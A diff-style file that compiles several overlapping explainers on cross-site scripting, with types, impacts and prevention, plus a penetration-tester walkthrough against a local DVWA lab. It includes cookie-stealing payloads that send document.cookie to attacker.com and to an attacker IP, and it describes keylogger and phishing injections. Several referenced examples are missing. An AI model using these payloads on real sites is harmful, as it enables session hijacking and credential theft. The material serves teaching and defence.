@@ -1,0 +1,186 @@
+Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.
+An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page. For more details on the different types of XSS flaws, see: Types of Cross-Site Scripting.
+Stored attacks are those where the injected script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored information. Stored XSS is also sometimes referred to as Persistent or Type-I XSS.
+Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. Reflected attacks are delivered to victims via another route, such as in an e-mail message, or on some other website. When a user is tricked into clicking on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable web site, which reflects the attack back to the user’s browser. The browser then executes the code because it came from a trusted server. Reflected XSS is also sometimes referred to as Non-Persistent or Type-II XSS.
+Cross-site scripting, also known as XSS, is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same-origin policy. Cross-site scripting carried out on websites accounted for roughly 84% of all security vulnerabilities documented by Symantec as of 2007. Bug bounty company HackerOne in 2017 reported that XSS is still a major threat vector. XSS effects vary in range from petty nuisance to significant security risk, depending on the sensitivity of the data handled by the vulnerable site and the nature of any security mitigation implemented by the site's owner.
+The non-persistent (or reflected) cross-site scripting vulnerability is by far the most basic type of web vulnerability. These holes show up when the data provided by a web client, most commonly in HTTP query parameters (e.g. HTML form submission), is used immediately by server-side scripts to parse and display a page of results for and to that user, without properly sanitizing the request.
+The persistent (or stored) XSS vulnerability is a more devastating variant of a cross-site scripting flaw: it occurs when the data provided by the attacker is saved by the server, and then permanently displayed on normal pages returned to other users in the course of regular browsing, without proper HTML escaping. A classic example of this is with online message boards where users are allowed to post HTML formatted messages for other users to read.
+Cross-site Scripting (XSS) refers to client-side code injection attack wherein an attacker can execute malicious scripts (also commonly referred to as a malicious payload) into a legitimate website or web application. XSS is amongst the most rampant of web application vulnerabilities and occurs when a web application makes use of unvalidated or unencoded user input within the output it generates.
+
+To understand the Cross-site Scripting vulnerability you have to first understand the basic concept of the Same Origin Policy (SOP), which forbids websites to retrieve content from pages with another origin. By forbidding access to cross-origin content random websites cannot not read or modify data from your Facebook page or PayPal account while logged in to them.
+The Cross-site Scripting (XSS) Vulnerability
+Cross-site Scripting, also known as XSS, is a way of bypassing the SOP concept. Whenever HTML code is generated dynamically, and the user input is not sanitized and is reflected on the page an attacker could insert his own HTML code. The web browser will still show the user's code since it pertains to the website where it is injected.
+In such case an attacker can easily insert javascript code which would run under the site's context. By doing so the attacker is able to access other pages on the same domain and can read data like CSRF-Tokens or the set cookies.
+If the cookies, which typically contain session identifier information can be read by the javascript, the attacker can use them on his own browser and login to the web application as the victim. If that does not work the attacker can still read private information from the pages, such as read CSRF tokens and make requests on behalf of the user.
+Different Types of Cross-Site Scripting Vulnerability
+There are mainly three different types of Cross-site Scripting vulnerability; Stored, Reflected and DOM XSS. Below you can find a detailed technical explanation of each of them.
+Stored Cross-site Scripting Vulnerability
+Stored Cross-site scripting vulnerabilities happens when the payload is saved, for example in a database and then is executed when a user opens the page. Stored cross-site scripting is very dangerous for a number of reasons:
+The payload is not visible for the browser's XSS filter
+Users might accidentally trigger the payload if they visit the affected page, while a crafted url or specific form inputs would be required for exploiting reflected XSS.
+Example of a Stored XSS
+A stored XSS vulnerability can happen if the username of an online forum member is not properly sanitized when it is printed on the page. In such case an attacker can insert malicious code when registering a new user on the form. When the username is reflected on the forum page, it will look like this:
+Username: user123<script>document.location='https://attacker.com/?cookie='+encodeURIComponent(document.cookie)</script>
+Registered since: 2016
+The above code is triggered every time a user visits this forum section, and it sends the users' cookies of the forum to the attacker, who is then able to use them to hijack their sessions. Stored XSS can be a very dangerous vulnerability since it can have the effect of a worm, especially when exploited on popular pages.
+For example imagine a forum or social media website that has a public facing page that is vulnerable to a stored XSS vulnerability, such as the profile page of the user. If the attacker is able to place a malicious payload that adds itself to the profile page, each time someone opens it the payload will spread itself with an exponential growth.
+Reflected Cross-site Scripting (XSS) Vulnerability
+A reflected XSS vulnerability happens when the user input from a URL or POST data is reflected on the page without being stored. This means that an attacker has to send a crafted link or post form to the victim to insert the payload, and the victim should click the link. This kind of payload is also generally being caught by built in browser XSS filters, like in Chrome, Internet Explorer or Edge.
+Example of a Reflected XSS
+As an example we will use a search functionality on a news website, which works by appending the user's input, which is taken from the GET request, to the q parameter, as per the example below:
+In the search results the website reflects the content of the query that the user searched for, such as:
+You searched for "data breach":
+If the Search functionality is vulnerable to a reflected cross-site scripting vulnerability, the attacker can send the victim a link such as the below:
+Once the victim clicks on the link, the website will display the following:
+The HTML source code, which is reflecting the attacker's malicious code redirects the victim to a website that is controlled by the attacker, which can then record the user's current cookie for example.com as GET parameter.
+DOM Based Cross-Site Scripting Vulnerability
+The DOM Based XSS vulnerability happens in the DOM (Document Object Model) instead of part of the HTML. Read DOM Based Cross-site Scripting (XSS) vulnerability for a detailed explanation of DOM XSS.
+Impacts of the Cross-site Scripting Vulnerability
+The impact of an exploited XSS vulnerability varies a lot. It ranges from Session Hijacking to the disclosure of sensitive data, CSRF attacks and more. By exploiting a cross-site scripting vulnerability an attacker can impersonate the victim and take over the account. If the victim has administrative rights it might even lead to code execution on the server, depending on the application and the privileges of the account. Read about the apache.org jira incident for more information on how a XSS vulnerbility was used in a succesful attack which also led to code execution.
+Preventing XSS Vulnerabilities
+To prevent cross-site scripting vulnerabilities it is very important to apply a context dependent output encoding. In some cases it might be enough to encode the HTML special characters, such as opening and closing tags. In other cases a correctly applied URL encoding is necessary. Links should generally be disallowed if they don't begin with a whitelisted protocol such as http:// or https://, thus preventing the use of URI schemes such as javascript://.
+Even though most modern web browsers have an inbuilt XSS filter they should not be seen as an alternative to sanitization. They cannot catch all kinds of cross-site scripting attacks and are not strict so not to lead to false positives, which would prevent some pages from loading correctly. A web browser's XSS filter should only be a "second line of defense" and the idea is to minimise the impact of existing vulnerabilities.
+Developers should not use blacklists as there is a variety of bypasses for them. Another thing they should avoid using is the stripping of dangerous functions and characters as the browsers' XSS filters can't recognize the dangerous payloads when the output is tampered with allowing for possible bypasses. That being said, the only recommended prevention of XSS is encoding as mentioned above.
+
+Cross-site scripting (XSS) is a type of injection security attack in which an attacker injects data, such as a malicious script, into content from otherwise trusted websites. Cross-site scripting attacks happen when an untrusted source is allowed to inject its own code into a web application, and that malicious code is included with dynamic content delivered to a victim's browser.
+Malicious scripts are often delivered in the form of bits of JavaScript code executed by the victim's browser, but exploits can incorporate malicious executable code in many other languages, including Java, Ajax, Flash and HTML. Cross-site scripting attacks can be very serious, but mitigating the vulnerabilities that enable such attacks is relatively easy.
+Cross-site scripting allows an attacker to execute malicious scripts in another user's browser. However, the attacker doesn't attack the victim directly; rather, the attacker exploits a vulnerability in a website the victim visits and gets the website to deliver the malicious script for the attacker.
+How cross-site scripting works
+Like all injection attacks, XSS takes advantage of the fact that browsers can't tell valid markup from attacker-controlled markup -- they just execute whatever markup text they receive. The attack circumvents the Same Origin Policy, which is intended to prevent scripts originating in one website from interacting with scripts from a different website.
+The Same Origin Policy requires that all content on a webpage come from the same source. When the Same Origin Policy isn't enforced, an attacker is able to inject a script and modify the webpage to suit their own purposes -- for example, to extract data that will allow the attacker to impersonate an authenticated user, or to input malicious code for the browser to execute.
+XSS can be used in a number of ways to cause serious problems. The traditional use of XSS enables an attacker to steal session cookies, allowing that attacker to pretend to be the user (victim). But it's not just stealing cookies; attackers can use XSS to spread malware, deface websites, create havoc on social networks, phish for credentials and in conjunction with social engineering techniques, perpetrate more damaging attacks.
+Cross-site scripting
+Types of XSS vulnerabilities
+There are three main categories of cross-site scripting vulnerabilities: stored XSS, reflected XSS and DOM-based XSS.
+Stored (persistent) XSS is the most damaging type of cross-site scripting attack. The attacker injects a script -- also called the payload -- that is stored permanently on the target application, such as a database. For example, an attacker inserts a malicious script on a blog, in a forum post or in a comment field.
+The XSS payload will be then be served as part of a webpage when the victim navigates to the affected webpage in a browser. Then, once the victim views the page in a browser, he will end up inadvertently executing the malicious script.
+Reflected XSS is the most common type of cross-site scripting vulnerability. In this type of attack, the attacker has to deliver the payload to the victim. Therefore, the attacker's payload script must be part of the request sent to the web server and reflected back so the HTTP response includes the payload from the HTTP request.
+The attacker uses phishing emails and other social engineering methods to lure the victim to inadvertently make a request to the server that includes the XSS payload. The victim then executes the script that gets reflected and executed inside the browser. Because reflected XSS isn't a persistent attack, the attacker must deliver the payload to each victim.
+DOM-based cross-site scripting is an advanced type of XSS attack made possible when the web application's client-side script writes user-provided data to the Document Object Model (DOM).
+The web application then reads the data from the DOM and delivers it to the browser. If the data isn't handled correctly, the attacker is able to inject a payload that will be stored as part of the DOM. The payload is then executed when the data is read back from the DOM.
+Cross-site scripting prevention methods
+The following are best known practices to prevent cross-site scripting:
+Escaping user input is one way to prevent XSS vulnerabilities from appearing in applications. This means taking the data an application has received and ensuring it's secure before rendering it for the user. Escaping user input prevents key characters in the data that a webpage receives from being interpreted as executable code. This means preventing the browser from interpreting characters used to signal the start or end of executable code, and it translates them to "escaped." For example, quote characters, parentheses, brackets and some other punctuation marks are sometimes used to set off executable code; "escaping" these characters means converting them from single characters that would not be displayed into strings that the browser interprets as printable versions of the characters.
+Sanitizing user input is another way to prevent cross-site scripting attacks, which is especially helpful on sites that allow HTML markup. This prevention method scrubs the data clean of potentially executable characters, changing unacceptable user input to an acceptable format and ensuring the data received  can't be interpreted as executable code.
+Input validation makes certain an application is rendering the correct data and preventing malicious data from harming a website, database and users. Validating input helps prevent XSS in forms because it stops a user from adding special characters into webpage data entry fields by refusing the request. Input validation helps reduce the possibility of harmful effects if an attacker should discover such an XSS vulnerability.
+
+Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy, which is designed to segregate different websites from each other. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data. If the victim user has privileged access within the application, then the attacker might be able to gain full control over all of the application's functionality and data. 
+Reflected cross-site scripting
+Reflected XSS is the simplest variety of cross-site scripting. It arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.
+If the user visits the URL constructed by the attacker, then the attacker's script executes in the user's browser, in the context of that user's session with the application. At that point, the script can carry out any action, and retrieve any data, to which the user has access.
+Stored cross-site scripting
+Stored XSS (also known as persistent or second-order XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.
+The data in question might be submitted to the application via HTTP requests; for example, comments on a blog post, user nicknames in a chat room, or contact details on a customer order. In other cases, the data might arrive from other untrusted sources; for example, a webmail application displaying messages received over SMTP, a marketing application displaying social media posts, or a network monitoring application displaying packet data from network traffic.
+Here is a simple example of a stored XSS vulnerability. A message board application lets users submit messages, which are displayed to other users:
+The application doesn't perform any other processing of the data, so an attacker can easily send a message that attacks other users:
+DOM-based cross-site scripting
+DOM-based XSS (also known as DOM XSS) arises when an application contains some client-side JavaScript that processes data from an untrusted source in an unsafe way, usually by writing the data back to the DOM.
+In the following example, an application uses some JavaScript to read the value from an input field and write that value to an element within the HTML:
+If the attacker can control the value of the input field, they can easily construct a malicious value that causes their own script to execute:
+In a typical case, the input field would be populated from part of the HTTP request, such as a URL query string parameter, allowing the attacker to deliver an attack using a malicious URL, in the same manner as reflected XSS.
+Impact of XSS vulnerabilities
+An attacker who exploits a cross-site scripting vulnerability is typically able to:
+Impersonate or masquerade as the victim user.
+Carry out any action that the user is able to perform.
+Read any data that the user is able to access.
+Capture the user's login credentials.
+Perform virtual defacement of the web site.
+Inject trojan functionality into the web site.
+The actual impact of the attack generally depends on the nature of the application, its functionality and data, and the status of the compromised user. For example:
+In a brochureware application, where all users are anonymous and all information is public, the impact will often be minimal.
+In an application holding sensitive data, such as banking transactions, emails, or healthcare records, the impact will usually be serious.
+If the compromised user has elevated privileges within the application, then the impact will generally be critical, allowing the attacker to take full control of the vulnerable application and compromise all users and their data.
+Finding XSS vulnerabilities
+The vast majority of XSS vulnerabilities can be found quickly and reliably using Burp Suite's web vulnerability scanner.
+Manually testing for reflected and stored XSS normally involves submitting some simple unique input (such as a short alphanumeric string) into every entry point in the application; identifying every location where the submitted input is returned in HTTP responses; and testing each location individually to determine whether suitably crafted input can be used to execute arbitrary JavaScript.
+Manually testing for DOM-based XSS arising from URL parameters involves a similar process: placing some simple unique input in the parameter, using the browser's developer tools to search the DOM for this input, and testing each location to determine whether it is exploitable. However, other types of DOM XSS are harder to detect. To find DOM-based vulnerabilities in non-URL-based input (such as document.cookie) or non-HTML-based sinks (like setTimeout), there is no substitute for reviewing JavaScript code, which can be extremely time-consuming. Burp Suite's web vulnerability scanner combines static and dynamic analysis of JavaScript to reliably automate the detection of DOM-based vulnerabilities.
+Preventing XSS vulnerabilities
+Preventing cross-site scripting is trivial in some cases but can be much harder depending on the complexity of the application and the ways it handles user-controllable data.
+In general, effectively preventing XSS vulnerabilities is likely to involve a combination of the following measures:
+At the point where user input is received, filter as strictly as possible based on what is expected or valid input.
+At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.
+To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend.
+As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.
+
+Let’s explore a couple of practical attack scenarios that can be implemented as PoCs to prove the real risk of Cross-Site Scripting (XSS) vulnerabilities.
+As a penetration tester, you want your customers to understand the risk of the vulnerabilities that you find. And the best way to do this is by creating a high-impact proof-of-concept (PoC) in which you show how attackers can exploit the vulnerabilities and affect the business.
+In this article we will see how to create XSS attack PoCs in order to:
+Hijack a user’s session
+Perform unauthorized activities
+Perform phishing attacks
+Capture key strokes
+Steal sensitive information
+Background
+Cross-Site Scripting (XSS) is a vulnerability in web applications and also the name of a client side attack in which the attacker injects and runs a malicious script into a legitimate web page. Browsers are capable of displaying HTML and executing JavaScript. If the application does not escape special characters in the input/output and reflects user input as-is back to the browser, an adversary may be able to launch a Cross-Site Scripting (XSS) attack successfully.
+You can find more information about this vulnerability in OWASP’s Cross-Site Scripting page.
+For demo purposes, we will use the well-known DVWA application, which we have installed locally.
+The DVWA page http://localhost:81/DVWA/vulnerabilities/xss_r/ is affected by a reflected XSS in the name parameter. This can be seen in the figure below when we inject the JavaScript code <script>alert(123)</script> and it is reflected and executed in the response page.
+Alert response in browser
+XSS Attack 1: Hijacking the user session
+Most web applications maintain user sessions in order to identify the user across multiple HTTP requests. Sessions are identified by session cookies.
+For example, after a successful login to an application, the server will send you a session cookie by the Set-Cookie header. Now, if you want to access any page in the application or submit a form, the cookie (which is now stored in the browser) will also be included in all the requests sent to the server. This way, the server will know who you are.
+Thus, session cookies are sensitive information which, if compromised, may allow an attacker to impersonate the legitimate user and gain access to his existing web session. This attack is called session hijacking.
+JavaScript code running in the browser can access the session cookies (when they lack the flag HTTPOnly) by calling document.cookie. So, if we inject the following payload into our name parameter, the vulnerable page will show the current cookie value in an alert box:
+User cookie in alert box
+Now, in order to steal the cookies, we have to provide a payload which will send the cookie value to the attacker-controlled website.
+The following payload creates a new Image object in the DOM of the current page and sets the src attribute to the attacker’s website. As a result, the browser will make a HTTP request to this external website (192.168.149.128) and the URL will contain the session cookie.
+So here is the attack URL which will send the cookies to our server: http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<script>new Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;</script>
+When the browser receives this request, it executes the JavaScript payload, which makes a new request to 192.168.149.128, along with the cookie value in the URL, as shown below.
+Send cookie request
+If we listen for an incoming connection on the attacker-controlled server (192.168.149.128), we can see an incoming request with cookie values (security and PHPSESSID) appended in the URL. The same information can be found in the access.log file on the server.
+Receive cookie on server
+Using the stolen cookie
+With the above cookie information, if we access any internal page of the application and append the cookie value in the request, we can access the page on behalf of the victim, in its own session (without knowing the username and password). Basically, we have hijacked the user’s session.
+Hijacked session Response cookie Response page html Response page browser
+The HTTPOnly cookie attribute can help to mitigate this scenario by preventing access to the cookie value through JavaScript. It can be set when initializing the cookie value (via Set-Cookie header).
+XSS Attack 2: Perform unauthorized activities
+If the HTTPOnly cookie attribute is set, we cannot steal the cookies through JavaScript. However, using the XSS attack, we can still perform unauthorized actions inside the application on behalf of the user.
+For instance, in this attack scenario we will post a new message in the Guestbook on behalf of the victim user, without his consent. For this, we need to forge a HTTP POST request to the Guestbook page with the appropriate parameters with JavaScript.
+The following payload will do this by creating an XMLHTTPRequest object and setting the necessary header and data:
+This is how the request looks like in the browser and also intercepted in Burp.
+Ajax in URL Ajax intercepted by Burp
+The script on execution will generate a new request to add a comment on behalf of the user.
+Ajax comment request Ajax comment successful
+XSS Attack 3: Phishing to steal user credentials
+XSS can also be used to inject a form into the vulnerable page and use this form to collect user credentials. This type of attack is called phishing.
+The payload below will inject a form with the message Please login to proceed, along with username and password input fields.
+When accessing the link below, the victim may enter its credentials in the injected form. Note that we can modify the payload to make it look like a legitimate form as per our need.
+Malicious login form
+Once the user enters their credentials and clicks on the Logon button, the request is sent to the attacker-controlled server. The request can be seen in the screenshots below:
+Request in Burp
+The credentials entered by the user (pentest:pentest) can be seen on the receiving server.
+Credentials on server
+XSS Attack 4: Capture the key strokes by injecting a keylogger
+In this attack scenario we will inject a JavaScript keylogger into the vulnerable web page and we will capture all the key strokes of the user within the current page.
+First of all, we will create a separate JavaScript file and we will host it on the attacker controlled server. We need this file because the payload is too big to be inserted in the URL and we avoid encoding and escaping errors. The JavaScript file contains the following code:
+Keylogger code
+On every key press, a new XMLHttp request is generated and sent towards the keylog.php page hosted at the attacker controlled server. The code in keylog.php writes the value of the pressed keys into a file called data.txt.
+Keylogger open file
+Now we need to call the vulnerable page with the payload from our server:
+Once the script is loaded on the page, a new request is fired with every stroke of any key.
+Receive keystroke
+The value of parameter key is being written to the data.txt file, as shown in the screenshot below.
+Data.txt file with word received
+XSS Attack 5: Stealing sensitive information
+Another malicious activity that can be performed with an XSS attack is stealing sensitive information from the user’s current session. Imagine that an internet banking application is vulnerable to XSS, the attacker could read the current balance, transaction information, personal data, etc.
+For this scenario we need to create a JavaScript file on the attacker controlled server. The file contains logic that takes a screenshot of the page where the script is running:
+Sensitive data screenshot code
+Then we need to create a PHP file on the attacker’s server, which saves the content of the png parameter into the test.png file.
+Sensitive data png parameter
+Now we inject the JavaScript code into the vulnerable page by tricking the user to access the following URL:
+Once the JavaScript file is loaded, the script sends the data in base64 format to the saveshot.php file which writes the data into the test.png file. On opening the test.png file, we can see the screen capture of the vulnerable page.
+Vulnerable screenshot
+Another way
+Another way to steal the page content would be to get the HTML source code by using getElementById. Here is a payload that gets the innerHTML of the guestbook_comments element and sends it to the attacker.
+Sensitive data received comment
+We can also fetch the entire page source of the page by using the following payload:
+Sensitive data entire source Sensitive data entire source received in netcat
+Decoding the received data in Burp Decoder gives us the cleartext page source of the vulnerable page. Here, we can see the Guestbook comments.
+Conclusion
+Depending on the functionality and data processed by the vulnerable application, XSS vulnerabilities can pose a significant risk to the business. Attackers could steal confidential information, perform unauthorized activities and take over the entire web sessions of the victim users.
+
+Cross-site scripting (XSS) is a security breach that takes advantage of dynamically generated Web pages. In an XSS attack, a Web application is sent with a script that activates when it is read by an unsuspecting user's browser or by an application that has not protected itself against cross-site scripting. Because dynamic Web sites rely on user input, a malicious user can input malicious script into the page by hiding it within legitimate requests.
+Common exploitation include search engine boxes, online forums and public-accessed blogs. Once XSS has been launched, the attacker can change user settings, hijack accounts, poison cookies with malicious code, expose SSL connections, access restricted sites and even launch false advertisements. The simplest way to avoid XSS is to add code to a Web application that causes the dynamic input to ignore certain command tags.
+Scripting tags that take advantage of XSS include <SCRIPT>, <OBJECT>, <APPLET>, <EMBED> and <FORM>.
+Common languages used for XSS include JavaScript, VBScript, HTML, Perl, C++, ActiveX and Flash.
+Cross-site scripting also is referred to as malicious tagging and sometimes abbreviated as CSS, though CSS is more commonly used as an abbreviation for cascading style sheets.
